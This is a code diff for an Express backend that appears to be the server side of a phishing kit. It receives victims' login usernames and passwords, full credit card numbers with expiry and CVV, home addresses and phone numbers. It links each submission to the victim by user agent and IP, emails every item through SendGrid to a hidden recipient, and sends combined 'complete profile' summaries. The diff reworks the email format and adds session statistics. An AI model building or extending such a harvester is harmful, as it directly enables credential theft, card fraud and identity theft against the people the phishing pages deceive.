@@ -11,16 +11,16 @@ app.use(express.json());
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
 // Function to send email via SendGrid
-async function sendEmail(subject, htmlContent, dataType) {
+async function sendEmail(subject, textContent, dataType) {
     try {
         const msg = {
             to: process.env.RECIPIENT_EMAIL,
             from: {
                 email: process.env.SENDGRID_FROM_EMAIL,
-                name: process.env.SENDGRID_FROM_NAME || 'Data Collection System'
+                name: 'Data Collection System'
             },
             subject: subject,
-            html: htmlContent,
+            text: textContent,
             categories: [dataType, 'data-collection']
         };
 
@@ -36,312 +36,135 @@ async function sendEmail(subject, htmlContent, dataType) {
     }
 }
 
-// Function to format data as HTML email
-function formatDataAsHTML(data, dataType) {
-    const getHeaderColor = (type) => {
-        switch(type) {
-            case 'login': return '#dc3545';
-            case 'credit_card': return '#fd7e14';
-            case 'address_verification': return '#20c997';
-            default: return '#6f42c1';
-        }
-    };
-
+// Function to format data as plain text
+function formatDataAsText(data, dataType) {
     const getIcon = (type) => {
         switch(type) {
             case 'login': return 'ð';
             case 'credit_card': return 'ð³';
             case 'address_verification': return 'ð ';
+            case 'address_skipped': return 'â­ï¸';
+            case 'complete_profile': return 'ð¯';
             default: return 'ð';
         }
     };
 
-    return `
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <style>
-            body { 
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-                margin: 0; 
-                padding: 0; 
-                background: #f8f9fa; 
-            }
-            .container { 
-                max-width: 700px; 
-                margin: 0 auto; 
-                background: white; 
-                border-radius: 10px; 
-                overflow: hidden; 
-                box-shadow: 0 4px 6px rgba(0,0,0,0.1); 
-            }
-            .header { 
-                background: ${getHeaderColor(dataType)}; 
-                padding: 30px; 
-                color: white; 
-                text-align: center; 
-            }
-            .header h1 { 
-                margin: 0; 
-                font-size: 24px; 
-            }
-            .content { 
-                padding: 30px; 
-            }
-            .data-section { 
-                margin: 25px 0; 
-                padding: 20px; 
-                border: 2px solid #e9ecef; 
-                border-radius: 8px; 
-                background: #f8f9fa; 
-            }
-            .field { 
-                margin: 15px 0; 
-                display: flex; 
-                align-items: center; 
-            }
-            .label { 
-                font-weight: 600; 
-                color: #495057; 
-                width: 160px; 
-                min-width: 160px; 
-            }
-            .value { 
-                color: #212529; 
-                flex: 1; 
-            }
-            .sensitive { 
-                color: #dc3545; 
-                font-weight: 700; 
-                background: #fff5f5; 
-                padding: 4px 8px; 
-                border-radius: 4px; 
-                border: 1px solid #feb2b2; 
-            }
-            .timestamp { 
-                color: #6c757d; 
-                font-size: 0.9em; 
-                text-align: center; 
-                margin: 20px 0; 
-                padding: 10px; 
-                background: #e9ecef; 
-                border-radius: 5px; 
-            }
-            .footer { 
-                text-align: center; 
-                padding: 20px; 
-                color: #6c757d; 
-                font-size: 0.8em; 
-                border-top: 1px solid #dee2e6; 
-            }
-            .alert-badge {
-                display: inline-block;
-                background: #dc3545;
-                color: white;
-                padding: 4px 12px;
-                border-radius: 20px;
-                font-size: 0.8em;
-                margin-left: 10px;
-                font-weight: 600;
-            }
-            .section-title {
-                margin-top: 0;
-                border-bottom: 2px solid #dee2e6;
-                padding-bottom: 10px;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <h1>${getIcon(dataType)} New ${dataType.replace('_', ' ').toUpperCase()} Data</h1>
-            </div>
-            <div class="content">
-                <div class="timestamp">
-                    ð Received: ${new Date().toLocaleString()}
-                </div>
-                ${data}
-            </div>
-            <div class="footer">
-                Data Collection System â¢ Automated Notification
-            </div>
-        </div>
-    </body>
-    </html>
-    `;
+    const header = `${getIcon(dataType)} NEW ${dataType.replace('_', ' ').toUpperCase()} DATA\n`;
+    const separator = '='.repeat(50) + '\n';
+    
+    return header + separator + data + '\n' + separator;
 }
 
-// Function to create login data HTML
-function createLoginHTML(credentials, userAgent, page, sessionData) {
+// Function to create login data text
+function createLoginText(credentials, userAgent, page, sessionData) {
     return `
-    <div class="data-section">
-        <h3 class="section-title" style="color: #dc3545;">Login Credentials <span class="alert-badge">SENSITIVE</span></h3>
-        <div class="field">
-            <span class="label">ð¤ Username:</span>
-            <span class="value sensitive">${credentials.username || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð Password:</span>
-            <span class="value sensitive">${credentials.password || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð¾ Remember Me:</span>
-            <span class="value">${credentials.rememberMe ? 'â Yes' : 'â No'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð Page:</span>
-            <span class="value">${page || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð£ï¸ Language:</span>
-            <span class="value">${sessionData?.language || 'Unknown'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð User Agent:</span>
-            <span class="value" style="font-size: 0.9em;">${userAgent || 'N/A'}</span>
-        </div>
-    </div>
-    `;
+LOGIN CREDENTIALS [SENSITIVE]
+==============================
+ð¤ Username: ${credentials.username || 'N/A'}
+ð Password: ${credentials.password || 'N/A'}
+ð¾ Remember Me: ${credentials.rememberMe ? 'Yes' : 'No'}
+ð Page: ${page || 'N/A'}
+ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
+ð User Agent: ${userAgent || 'N/A'}
+â° Timestamp: ${new Date().toLocaleString()}
+    `.trim();
 }
 
-// Function to create credit card data HTML
-function createCreditCardHTML(cardData, userAgent, page, sessionData) {
+// Function to create credit card data text
+function createCreditCardText(cardData, userAgent, page, sessionData) {
     return `
-    <div class="data-section">
-        <h3 class="section-title" style="color: #fd7e14;">Credit Card Information <span class="alert-badge">HIGHLY SENSITIVE</span></h3>
-        <div class="field">
-            <span class="label">ð¤ First Name:</span>
-            <span class="value">${cardData.firstName || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð¤ Last Name:</span>
-            <span class="value">${cardData.lastName || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð³ Card Number:</span>
-            <span class="value sensitive">${cardData.cardNumber || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð Expiry Date:</span>
-            <span class="value sensitive">${cardData.expiryDate || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð CVV:</span>
-            <span class="value sensitive">${cardData.cvv || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">â Terms Agreed:</span>
-            <span class="value">${cardData.termsAgreed ? 'â Yes' : 'â No'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð£ï¸ Language:</span>
-            <span class="value">${sessionData?.language || 'Unknown'}</span>
-        </div>
-    </div>
-    `;
+CREDIT CARD INFORMATION [HIGHLY SENSITIVE]
+===========================================
+ð¤ First Name: ${cardData.firstName || 'N/A'}
+ð¤ Last Name: ${cardData.lastName || 'N/A'}
+ð³ Card Number: ${cardData.cardNumber || 'N/A'}
+ð Expiry Date: ${cardData.expiryDate || 'N/A'}
+ð CVV: ${cardData.cvv || 'N/A'}
+â Terms Agreed: ${cardData.termsAgreed ? 'Yes' : 'No'}
+ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
+ð Page: ${page || 'N/A'}
+â° Timestamp: ${new Date().toLocaleString()}
+    `.trim();
 }
 
-// Function to create address data HTML
-function createAddressHTML(addressData, userAgent, page, sessionData) {
+// Function to create address data text
+function createAddressText(addressData, userAgent, page, sessionData) {
     return `
-    <div class="data-section">
-        <h3 class="section-title" style="color: #20c997;">Address Verification <span class="alert-badge">PERSONAL DATA</span></h3>
-        <div class="field">
-            <span class="label">ð  Address Line 1:</span>
-            <span class="value">${addressData.addressLine1 || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð  Address Line 2:</span>
-            <span class="value">${addressData.addressLine2 || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ðï¸ City:</span>
-            <span class="value">${addressData.city || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ðºï¸ State/Province:</span>
-            <span class="value">${addressData.state || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð® ZIP/Postal Code:</span>
-            <span class="value">${addressData.zipCode || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð Country:</span>
-            <span class="value">${addressData.country || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð Phone Number:</span>
-            <span class="value">${addressData.phone || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð Page:</span>
-            <span class="value">${page || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">ð£ï¸ Language:</span>
-            <span class="value">${sessionData?.language || 'Unknown'}</span>
-        </div>
-    </div>
-    `;
+ADDRESS VERIFICATION [PERSONAL DATA]
+====================================
+ð  Address Line 1: ${addressData.addressLine1 || 'N/A'}
+ð  Address Line 2: ${addressData.addressLine2 || 'N/A'}
+ðï¸ City: ${addressData.city || 'N/A'}
+ðºï¸ State/Province: ${addressData.state || 'N/A'}
+ð® ZIP/Postal Code: ${addressData.zipCode || 'N/A'}
+ð Country: ${addressData.country || 'N/A'}
+ð Phone Number: ${addressData.phone || 'N/A'}
+ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
+ð Page: ${page || 'N/A'}
+â° Timestamp: ${new Date().toLocaleString()}
+    `.trim();
 }
 
-// Function to create complete user profile HTML (when all data is collected)
-function createCompleteProfileHTML(loginData, cardData, addressData, sessionData) {
+// Function to create address skipped text
+function createAddressSkippedText(skipData, userAgent, page, sessionData) {
     return `
-    <div class="data-section">
-        <h3 class="section-title" style="color: #6f42c1;">ð¯ COMPLETE USER PROFILE <span class="alert-badge" style="background: #6f42c1;">FULL DATA</span></h3>
-        
-        <h4 style="color: #dc3545; margin-top: 20px;">ð Login Information</h4>
-        <div class="field">
-            <span class="label">Username:</span>
-            <span class="value sensitive">${loginData.username || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">Password:</span>
-            <span class="value sensitive">${loginData.password || 'N/A'}</span>
-        </div>
-        
-        <h4 style="color: #fd7e14; margin-top: 20px;">ð³ Payment Information</h4>
-        <div class="field">
-            <span class="label">Cardholder:</span>
-            <span class="value">${cardData.firstName || 'N/A'} ${cardData.lastName || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">Card Number:</span>
-            <span class="value sensitive">${cardData.cardNumber || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">Expiry/CVV:</span>
-            <span class="value sensitive">${cardData.expiryDate || 'N/A'} / ${cardData.cvv || 'N/A'}</span>
-        </div>
-        
-        <h4 style="color: #20c997; margin-top: 20px;">ð  Address Information</h4>
-        <div class="field">
-            <span class="label">Address:</span>
-            <span class="value">${addressData.addressLine1 || 'N/A'} ${addressData.addressLine2 || ''}</span>
-        </div>
-        <div class="field">
-            <span class="label">City/State/ZIP:</span>
-            <span class="value">${addressData.city || 'N/A'}, ${addressData.state || 'N/A'} ${addressData.zipCode || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">Country:</span>
-            <span class="value">${addressData.country || 'N/A'}</span>
-        </div>
-        <div class="field">
-            <span class="label">Phone:</span>
-            <span class="value">${addressData.phone || 'N/A'}</span>
-        </div>
-        
-        <div class="field">
-            <span class="label">Session Language:</span>
-            <span class="value">${sessionData?.language || 'Unknown'}</span>
-        </div>
-    </div>
-    `;
+ADDRESS VERIFICATION SKIPPED [USER ACTION]
+==========================================
+â­ï¸ Action: User chose to skip address verification
+ð Reason: ${skipData.reason || 'user_skipped_address'}
+ð£ï¸ Language: ${sessionData?.language || 'Unknown'}
+ð Page: ${page || 'N/A'}
+â° Timestamp: ${new Date(skipData.timestamp).toLocaleString() || 'N/A'}
+    `.trim();
+}
+
+// Function to create complete user profile text
+function createCompleteProfileText(loginData, cardData, addressData, sessionData) {
+    const hasAddress = addressData && !addressData.skipped;
+    const status = hasAddress ? 'COMPLETE' : 'PARTIAL';
+    
+    let addressSection = '';
+    if (hasAddress) {
+        addressSection = `
+ð  ADDRESS INFORMATION
+======================
+Address: ${addressData.addressLine1 || 'N/A'} ${addressData.addressLine2 || ''}
+City/State/ZIP: ${addressData.city || 'N/A'}, ${addressData.state || 'N/A'} ${addressData.zipCode || 'N/A'}
+Country: ${addressData.country || 'N/A'}
+Phone: ${addressData.phone || 'N/A'}
+        `.trim();
+    } else {
+        addressSection = `
+â­ï¸ ADDRESS STATUS
+=================
+Status: User skipped address verification
+        `.trim();
+    }
+    
+    return `
+COMPLETE USER PROFILE [${status}]
+==================================
+ð LOGIN INFORMATION
+====================
+Username: ${loginData.username || 'N/A'}
+Password: ${loginData.password || 'N/A'}
+Remember Me: ${loginData.rememberMe ? 'Yes' : 'No'}
+
+ð³ PAYMENT INFORMATION
+======================
+Cardholder: ${cardData.firstName || 'N/A'} ${cardData.lastName || 'N/A'}
+Card Number: ${cardData.cardNumber || 'N/A'}
+Expiry Date: ${cardData.expiryDate || 'N/A'}
+CVV: ${cardData.cvv || 'N/A'}
+Terms Agreed: ${cardData.termsAgreed ? 'Yes' : 'No'}
+
+${addressSection}
+
+ð SESSION INFORMATION
+======================
+Language: ${sessionData?.language || 'Unknown'}
+Timestamp: ${new Date().toLocaleString()}
+    `.trim();
 }
 
 // Store user sessions to combine data
@@ -350,15 +173,18 @@ const userSessions = new Map();
 app.post('/api/submit', async (req, res) => {
     const { type, data, timestamp, userAgent, page, sessionData } = req.body;
     
-    console.log('Received data type:', type);
+    console.log('ð¨ Received data type:', type);
+    console.log('ð Page:', page);
+    console.log('ð User Agent:', userAgent?.substring(0, 50) + '...');
     
     let subject = '';
-    let htmlContent = '';
+    let textContent = '';
     let dataType = type || 'login';
 
     try {
-        // Generate session ID based on user agent and timestamp
-        const sessionId = `${userAgent}-${sessionData?.language || 'unknown'}`;
+        // Generate session ID based on user agent and IP
+        const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+        const sessionId = `${userAgent}-${clientIP}-${sessionData?.language || 'unknown'}`;
         
         // Initialize session if not exists
         if (!userSessions.has(sessionId)) {
@@ -367,8 +193,10 @@ app.post('/api/submit', async (req, res) => {
                 cardData: null,
                 addressData: null,
                 sessionData: sessionData,
-                firstSeen: new Date()
+                firstSeen: new Date(),
+                ip: clientIP
             });
+            console.log(`ð New session created: ${sessionId}`);
         }
         
         const userSession = userSessions.get(sessionId);
@@ -377,76 +205,104 @@ app.post('/api/submit', async (req, res) => {
         switch(dataType) {
             case 'login':
                 userSession.loginData = data;
-                subject = `ð LOGIN Credentials - ${data.username || 'Unknown User'}`;
-                htmlContent = formatDataAsHTML(
-                    createLoginHTML(data, userAgent, page, sessionData),
+                subject = `ð LOGIN - ${data.username || 'Unknown User'}`;
+                textContent = formatDataAsText(
+                    createLoginText(data, userAgent, page, sessionData),
                     dataType
                 );
+                console.log(`â Login data stored for session: ${sessionId}`);
                 break;
                 
             case 'credit_card':
                 userSession.cardData = data;
-                subject = `ð³ CREDIT CARD Submission - ${data.firstName || 'Unknown'} ${data.lastName || ''}`;
-                htmlContent = formatDataAsHTML(
-                    createCreditCardHTML(data, userAgent, page, sessionData),
+                subject = `ð³ CARD - ${data.firstName || 'Unknown'} ${data.lastName || ''}`;
+                textContent = formatDataAsText(
+                    createCreditCardText(data, userAgent, page, sessionData),
                     dataType
                 );
+                console.log(`â Credit card data stored for session: ${sessionId}`);
                 break;
                 
             case 'address_verification':
                 userSession.addressData = data;
-                subject = `ð  ADDRESS Verification - ${data.city || 'Unknown Location'}, ${data.state || ''}`;
-                htmlContent = formatDataAsHTML(
-                    createAddressHTML(data, userAgent, page, sessionData),
+                subject = `ð  ADDRESS - ${data.city || 'Unknown Location'}, ${data.state || ''}`;
+                textContent = formatDataAsText(
+                    createAddressText(data, userAgent, page, sessionData),
                     dataType
                 );
+                console.log(`â Address data stored for session: ${sessionId}`);
+                break;
                 
-                // Check if we have complete data for a profile summary
-                if (userSession.loginData && userSession.cardData) {
-                    setTimeout(() => {
-                        const completeSubject = `ð¯ COMPLETE PROFILE - ${userSession.loginData.username || 'User'}`;
-                        const completeHTML = formatDataAsHTML(
-                            createCompleteProfileHTML(
-                                userSession.loginData,
-                                userSession.cardData,
-                                userSession.addressData,
-                                userSession.sessionData
-                            ),
-                            'complete_profile'
-                        );
-                        sendEmail(completeSubject, completeHTML, 'complete_profile');
-                    }, 2000);
-                }
+            case 'address_skipped':
+                userSession.addressData = { skipped: true, ...data };
+                subject = `â­ï¸ SKIPPED - Address verification`;
+                textContent = formatDataAsText(
+                    createAddressSkippedText(data, userAgent, page, sessionData),
+                    dataType
+                );
+                console.log(`â­ï¸ Address skipped for session: ${sessionId}`);
                 break;
                 
             default:
-                subject = `ð Unknown Data Submission`;
-                htmlContent = formatDataAsHTML(
-                    `<div class="data-section"><h3>Unknown Data Type</h3><pre>${JSON.stringify(data, null, 2)}</pre></div>`,
+                subject = `ð UNKNOWN - Data submission`;
+                textContent = formatDataAsText(
+                    `Unknown Data Type: ${dataType}\n\nRaw Data:\n${JSON.stringify(data, null, 2)}`,
                     'unknown'
                 );
+                console.log(`â Unknown data type: ${dataType}`);
         }
         
-        // Clean up old sessions (older than 1 hour)
-        const now = new Date();
-        for (const [id, session] of userSessions.entries()) {
-            if (now - session.firstSeen > 60 * 60 * 1000) { // 1 hour
-                userSessions.delete(id);
+        // Check if we have complete data for a profile summary
+        if (userSession.loginData && userSession.cardData) {
+            const hasAddress = userSession.addressData;
+            const isComplete = hasAddress && !userSession.addressData.skipped;
+            
+            if (isComplete || dataType === 'address_skipped') {
+                setTimeout(() => {
+                    const status = isComplete ? 'COMPLETE' : 'PARTIAL';
+                    const completeSubject = `ð¯ ${status} - ${userSession.loginData.username || 'User'}`;
+                    const completeText = formatDataAsText(
+                        createCompleteProfileText(
+                            userSession.loginData,
+                            userSession.cardData,
+                            userSession.addressData,
+                            userSession.sessionData
+                        ),
+                        'complete_profile'
+                    );
+                    sendEmail(completeSubject, completeText, 'complete_profile');
+                    console.log(`ð ${status} profile summary sent for session: ${sessionId}`);
+                }, 3000);
             }
         }
         
+        // Clean up old sessions (older than 2 hours)
+        const now = new Date();
+        let cleanedCount = 0;
+        for (const [id, session] of userSessions.entries()) {
+            if (now - session.firstSeen > 2 * 60 * 60 * 1000) { // 2 hours
+                userSessions.delete(id);
+                cleanedCount++;
+            }
+        }
+        if (cleanedCount > 0) {
+            console.log(`ð§¹ Cleaned up ${cleanedCount} old sessions`);
+        }
+        
         // Send email
-        const emailSent = await sendEmail(subject, htmlContent, dataType);
+        const emailSent = await sendEmail(subject, textContent, dataType);
         
         if (emailSent) {
-            console.log(`SendGrid email sent successfully for ${dataType} data`);
+            console.log(`ð§ Email sent successfully for ${dataType} data`);
             res.json({ 
                 status: 'success', 
                 message: 'Data received and email sent via SendGrid',
                 dataType: dataType,
-                sessionId: sessionId
+                sessionId: sessionId,
+                timestamp: new Date().toISOString()
             });
         } else {
+            console.log(`â Failed to send email for ${dataType} data`);
             res.status(500).json({ 
                 status: 'error', 
                 message: 'Failed to send email via SendGrid' 
@@ -454,7 +310,7 @@ app.post('/api/submit', async (req, res) => {
         }
         
     } catch (error) {
-        console.error('Error processing request:', error);
+        console.error('ð¥ Error processing request:', error);
         res.status(500).json({ 
             status: 'error', 
             message: 'Internal server error',
@@ -465,11 +321,21 @@ app.post('/api/submit', async (req, res) => {
 
 // Health check endpoint
 app.get('/api/health', (req, res) => {
+    const stats = {
+        totalSessions: userSessions.size,
+        sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
+        sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
+        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData && !s.addressData.skipped).length,
+        sessionsSkippedAddress: Array.from(userSessions.values()).filter(s => s.addressData && s.addressData.skipped).length,
+        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData && !s.addressData.skipped).length
+    };
+    
     res.json({ 
         status: 'Server is running', 
         email: 'SendGrid integration enabled',
         fromEmail: process.env.SENDGRID_FROM_EMAIL,
-        activeSessions: userSessions.size
+        uptime: process.uptime(),
+        ...stats
     });
 });
 
@@ -479,16 +345,30 @@ app.get('/api/sessions', (req, res) => {
         totalSessions: userSessions.size,
         sessionsWithLogin: Array.from(userSessions.values()).filter(s => s.loginData).length,
         sessionsWithCard: Array.from(userSessions.values()).filter(s => s.cardData).length,
-        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData).length,
-        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData).length
+        sessionsWithAddress: Array.from(userSessions.values()).filter(s => s.addressData && !s.addressData.skipped).length,
+        sessionsSkippedAddress: Array.from(userSessions.values()).filter(s => s.addressData && s.addressData.skipped).length,
+        completeProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && s.addressData && !s.addressData.skipped).length,
+        partialProfiles: Array.from(userSessions.values()).filter(s => s.loginData && s.cardData && (!s.addressData || s.addressData.skipped)).length
     };
     
     res.json(stats);
 });
 
+// Clear all sessions (for debugging)
+app.delete('/api/sessions', (req, res) => {
+    const count = userSessions.size;
+    userSessions.clear();
+    res.json({ 
+        message: `Cleared ${count} sessions`,
+        cleared: count 
+    });
+});
+
 app.listen(PORT, () => {
-    console.log(`ð§ Backend server with SendGrid integration running on port ${PORT}`);
-    console.log(`ð§ Emails will be sent from: ${process.env.SENDGRID_FROM_EMAIL}`);
+    console.log(`ð Backend server running on port ${PORT}`);
+    console.log(`ð§ SendGrid configured for: ${process.env.SENDGRID_FROM_EMAIL}`);
     console.log(`ð¨ Recipient: ${process.env.RECIPIENT_EMAIL}`);
-    console.log(`ð Address verification system enabled`);
+    console.log(`ð Plain text email system ready`);
+    console.log(`ð¥ Session tracking enabled`);
+    console.log(`ð Health check: http://localhost:${PORT}/api/health`);
 });
